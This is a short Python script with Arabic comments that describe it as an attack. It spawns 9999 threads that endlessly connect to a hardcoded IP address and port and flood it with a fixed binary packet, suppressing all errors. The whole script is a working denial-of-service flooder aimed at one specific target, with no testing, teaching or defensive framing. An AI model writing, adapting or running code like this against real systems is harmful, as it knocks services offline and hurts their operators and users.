import socket
import threading

# إعدادات الهدف
ip = "5.223.46.86"
port = 10009
num_connections = 9999

# حزمة البيانات
packet = bytes.fromhex("F10400010600000001000000F2")
num_send_per_connection = 1000

# وظيفة الهجوم
def send_packets():
    while True:  # استمرار في الإرسال بدون توقف
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((ip, port))
                for _ in range(num_send_per_connection):
                    s.sendall(packet)
                print(f"Packets sent to {ip}:{port}")
        except Exception:
            # لا تظهر رسالة خطأ في حالة حدوث استثناء
            pass

# تنفيذ الهجوم باستخدام خيوط متعددة
threads = []
for _ in range(num_connections):
    thread = threading.Thread(target=send_packets)
    threads.append(thread)
    thread.start()

# انتظار انتهاء جميع الخيوط (لن يحدث لأن الهجوم مستمر)
for thread in threads:
    thread.join()
